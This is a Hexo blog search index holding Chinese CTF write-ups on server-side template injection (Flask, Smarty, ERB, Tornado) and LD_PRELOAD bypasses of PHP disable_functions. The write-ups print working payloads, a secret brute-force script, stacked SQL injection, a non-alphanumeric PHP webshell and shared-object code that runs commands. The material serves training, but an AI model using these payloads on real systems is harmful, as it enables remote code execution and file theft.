<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>备忘录[working]</title>
    <url>/2019/09/07/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ce245d30f430362971f03c8b547d283553acdcb336bc9639ac656a8c7b53502a"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>SSTI 题型记录[working forever]</title>
    <url>/2019/05/27/SSTI/</url>
    <content><![CDATA[<h2 id="2020-BJDCTF-The-Mystrery-of-IP">2020 BJDCTF The_Mystrery_of_IP</h2>
<p>题目会获取ip并在页面上显示</p>
<p><img src="/images/image-20200130182744898.png" alt="image-20200130182744898"></p>
<p>测试发现xff可以控制这里显示的ip.</p>
<p>模板注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-华东南赛区-Double-Secret">ciscn 华东南赛区 Double Secret</h2>
<p>超过四位的字符加密会报错, 报错信息中可以看到部分源码</p>
<p><img src="/images/image-20200121164528251.png" alt="image-20200121164528251"></p>
<p>将要加密的东西换成%ff, 又爆出了源码</p>
<p><img src="/images/image-20200121164628693.png" alt="image-20200121164628693"></p>
<p>是一个rc4 加解密的程序, rc4加密和解密流程是一样的, 流程大概就是将secret进行一个加密或者解密之后然后渲染输出, 然后密钥也给了, 那么只要把payload用rc4加密一下发送过去就行了</p>
<h2 id="SCTF-2019-flag-shop">SCTF 2019 flag shop</h2>
<p>robots.txt 提示 ,找到源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>代码能看懂, 就是不知道这个东西是<code>ERB</code>模板注入. …</p>
<p>访问<code>/work</code>的时候带上两个参数<code>name</code>和<code>do</code>, 如果do的内容是name的字符串加上 is working的话就往下走.在最终的结果中把name输出出来.</p>
<blockquote>
<p>没发觉是模板注入可能是因为不够敏感吧…</p>
</blockquote>
<p>然后又是一个没学过的东西<code>&lt;%=$~%&gt;</code>这个东西, 尖括号百分号和等号是相当于模板, 里面执行代码, <code>$~</code>这个东西代表了上一个正则匹配的内容(这都是什么玩意啊哭).因为源码中限制了只读取name的最大七个字符, 所以长一点的1+1都不行. 通过逐次正则匹配SECRET得到secret, 并用它去生成新的secret, 从而可以购买flag</p>
<p>注secret脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b81a8f39-4224-4747-a2d7-f27a1ff4cfed.node3.buuoj.cn/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.get(<span class="string">"http://b81a8f39-4224-4747-a2d7-f27a1ff4cfed.node3.buuoj.cn/api/auth"</span>)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">"2202b389684933646313a1bd8a6bc021ee4277bf191dbd270ccade2c9c5c6f4b74308094d863799ae846ef4694d0006e8512efe8c6272d194ccb0c2914da5"</span></span><br><span class="line">trigger = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">if</span> trigger==<span class="number">0</span>:</span><br><span class="line">            tmp = i+secret</span><br><span class="line">            print(url+tmp)</span><br><span class="line">            res = sess.get(url+tmp, allow_redirects=<span class="literal">False</span>).content</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            print(res)</span><br><span class="line">            print(len(res))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> len(res)&gt;<span class="number">48</span>:</span><br><span class="line">                secret = tmp</span><br><span class="line">                print(secret)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> i==<span class="string">"f"</span>:</span><br><span class="line">                trigger = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> trigger==<span class="number">1</span>:</span><br><span class="line">            tmp = secret+i</span><br><span class="line">            res = sess.get(url+tmp, allow_redirects=<span class="literal">False</span>).content</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            print(res)</span><br><span class="line">            print(len(res))</span><br><span class="line">            <span class="keyword">if</span> len(res)&gt;<span class="number">48</span>:</span><br><span class="line">                secret = tmp</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> i==<span class="string">"f"</span>:</span><br><span class="line">                print(secret)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20191231170305900.png" alt="image-20191231170305900"></p>
<p><img src="/images/image-20191231170332653.png" alt="image-20191231170332653"></p>
<h2 id="CISCN2019-华东南赛区-Web11">CISCN2019 华东南赛区 Web11</h2>
<p>开局一个api界面 ,</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png" alt="image"></p>
<p>看到xff, Smarty, 和右上角的东东…</p>
<p>这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2</p>
<p><a href="http://www.heetian.com/info/634" target="_blank" rel="noopener">http://www.heetian.com/info/634</a></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http://node3.buuoj.cn:27068/ -H &quot;X-Forwarded-For:&#123;if readfile(&apos;/flag&apos;)&#125;&#123;/if&#125;&quot;</span><br><span class="line">直接</span><br><span class="line">curl http://node3.buuoj.cn:27068/ -H &quot;X-Forwarded-For:&#123;readfile(&apos;/flag&apos;)&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>官方的payload报了错, 不知道为啥…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X GET \</span><br><span class="line">  http://node3.buuoj.cn:27068/ \</span><br><span class="line">  -H &apos;X-Forwarded-For: &#123;include file=&quot;/flag&quot;&#125;&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/71469592-a5829480-2804-11ea-86e1-a0f6241ee3a2.png" alt="image"></p>
<h2 id="2018护网杯easy-tornado">2018护网杯easy_tornado</h2>
<p>tornado SSTI.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png" alt="1562241369585"></p>
<p>Observe the url:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web9.buuoj.cn/file?filename=/hints.txt&amp;filehash=bf60e1051f59dbb931208200bcf8c08e</span><br><span class="line">http://web9.buuoj.cn/file?filename=/flag.txt&amp;filehash=245a5ccf5543f16709d8c22851af5454</span><br><span class="line">http://web9.buuoj.cn/file?filename=/welcome.txt&amp;filehash=1e1439df1c0c7eeb9e93a8e44a58bc9f</span><br></pre></td></tr></table></figure>
<p>click into flag.txt, which shows flag is in /fllllllllllag.</p>
<p>click into welcome.txt , which shows just a word <code>render</code>.</p>
<p>click into hint.txt, which shows filehash are generated by <code>md5(cookie_secret+md5(filename))</code></p>
<p>so , the question is , how to get <code>cookie_secret</code> ?While so many keywords were filtered.</p>
<p>In <code>web.py</code> ,we can see that <code>cookie_secret</code> is in <code>RequestHandler.application.settings</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511171-77fd1800-aa28-11e9-85dc-2ec521c8b955.png" alt="1562248424477"></p>
<p>While in <code>auth.py</code> ,there is an object oriented from <code>RequestHandler</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511187-82b7ad00-aa28-11e9-8efe-48dc206a9f74.png" alt="1562248566424"></p>
<p>Obviously, the <code>filehash</code> should be a trick from <a href="http://auth.py" target="_blank" rel="noopener">auth.py</a>(?)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png" alt="1562240071849"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png" alt="1562240945347"></p>
<blockquote>
<p>Summary:</p>
<p>Learning to develop is so important.!!!</p>
</blockquote>
<h2 id="百度杯-Fuzz">百度杯 Fuzz</h2>
<p>考察<code>Flask</code> 模板注入。</p>
<p>首先，使用Burpsuit的<code>Intruder</code>模块中的<code>server-side variable name</code> 字典来Fuzz，发现<code>name</code> 参数有端倪。</p>
<p>随便在name参数中输入一点什么，错误信息如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png" alt="image"></p>
<p>大蟒蛇(python) --&gt; Flask 模板注入。。。</p>
<p><code>/?name=1</code> 页面回显<code>Hello 1</code> 然后输入<code>/?name=1</code> 和<code>/?name=</code> 发现也执行了。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) %7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B config.from_pyfile(&apos;/tmp/owned.cfg&apos;) %7D%7D </span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D</span><br></pre></td></tr></table></figure>
<p><code>''.__class__.__mro__[2].__subclasses__()[40]</code> 的函数是<code>file</code> ，这里第一个payload是创建并往<code>/tmp/owned.cfg</code> 写代码。第二个payload是调用文件(Flask 中的用法) 。第三个payload是<code> config[\]('/usr/bin/id', shell=True)</code> ,(反斜杠是为了markdown中的转义)。</p>
<p>然后尝试<code>name=%7B%7B%20config[%27RUNCMD%27](%27ls%27,shell=True)%20%7D%7D</code>,发现被过滤，于是产生base64编码，最终结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27echo aW1wb3J0IG9zCmZvciAoZGlycGF0aCxkaXJuYW1lLG5hbWUpIGluIG9zLndhbGsoJy92YXIvd3d3L2h0bWwnKToKCXByaW50IG5hbWUKCXByaW50IGRpcnBhdGg=|base64 -d &gt; /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">base64: </span><br><span class="line">import os</span><br><span class="line">for (dirpath,dirname,name) in os.walk(&apos;/var/www/html&apos;):</span><br><span class="line">	print name</span><br><span class="line">	print dirpath</span><br></pre></td></tr></table></figure>
<p><code>name=%7B%7B%20config[%27RUNCMD%27] (%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py%27,shell=True)%20%7D%7D</code> base64码的内容是<code>print open('/var/www/html/fl4g','r').read()</code> 。</p>
<p>执行py<br>
<code>name=%7B%7B%20config[%27RUNCMD%27] (%27python /tmp/get.py%27,shell=True)%20%7D%7D</code></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>LD_PRELOAD劫持类型题目</title>
    <url>/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>贴几个参考链接</p>
<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11213732.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11213732.html</a></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<h1>byteCTF babyblog</h1>
<p>看首页</p>
<p><img src="/images/image-20200130163255077.png" alt="image-20200130163255077"></p>
<p>功能点</p>
<ul>
<li>写博客</li>
<li>编辑博客</li>
<li>删除博客</li>
<li>查找字符串并替换</li>
</ul>
<p><img src="/images/image-20200130163356347.png" alt="image-20200130163356347"></p>
<p>这个replace有点诡异, 需要<code>vip</code>身份, 看源代码关键的一步在<code>edit.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">		$title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">		$content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">		$sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里存在一处二次注入, 将原来的文章选出来后将他的title不经过addslashes直接拼接进了update语句中.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update users set isvip=1 where username=&apos;ch4ser&apos;</span><br><span class="line"></span><br><span class="line">&apos;;set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;&apos;</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20200130164043550.png" alt="image-20200130164043550"></p>
<p>这样我就是vip了, 可以使用replace功能了, 这个在源码中其实就是<code>preg_replace</code>.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br></pre></td></tr></table></figure>
<p>传入参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find=/e%00</span><br><span class="line">replace=phpinfo();</span><br></pre></td></tr></table></figure>
<p>就执行成功了, 写一个shell进去先. 然后发现system类函数都被禁用了, 而且还有basedir限制, 在<code>init_set</code>被禁止的情况下, 可以使用<code>glob</code>协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($dh = opendir(<span class="string">"glob:///*"</span>)) &#123;<span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>) &#123;<span class="keyword">echo</span> <span class="string">"$file\n"</span>;&#125;closedir($dh);&#125;</span><br></pre></td></tr></table></figure>
<p>发现根目录有<code>/readflag</code>和<code>/flag</code>, 接下来使用<code>LD_PRELOAD</code>来绕过<code>disable_function</code>的限制, 在<code>disable_function</code>中看到<code>mail</code>函数都被禁用了, 而且没有安装<code>imagemagick</code> , 可以考虑使用<code>error_log</code>来触发, 问题是这题目在buuoj经过了魔改, /readflag不会直接给出flag而是给出了一道计算题, 回答正确之后才会给出flag, 寻找一个perl脚本来执行, 这是*ctf的一道题目的perl脚本</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure>
<p>写入之后, <a href="http://xn--hack-u65j.xn--chack-gg1hyjy865ab7xa.so" target="_blank" rel="noopener">由hack.c编译一个hack.so</a>, hack.c内容如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">system(<span class="string">"perl /var/www/html/exp.perl &gt; /var/www/html/res 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpid</span><span class="params">()</span></span>&#123;</span><br><span class="line">  unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">  pwn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/var/www/html/payload.so&quot;);error_log(&quot;&quot;,1,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure>
<p>就可以拿到flag了</p>
<h1>极客大挑战 RCEme</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>首先是个无字母数字shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()</span><br></pre></td></tr></table></figure>
<p>很遗憾的发现system等函数都不能执行.</p>
<p>上蚁剑,但是很奇怪的不能直接用密码__来连接, 要这样连, 不然会有奇怪的东西显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_POST[a])</span><br></pre></td></tr></table></figure>
<p>…原来一定要eval么…</p>
<p>然后发现根目录下有无读权限的flag和一个readflag二进制文件.</p>
<p>连上之后向/tmp目录下面写两个东西, 一个是本地生成的so文件,</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hack.c -o hack.so</span><br></pre></td></tr></table></figure>
<p>拖上去就行了</p>
<p>ch4ser.php</p>
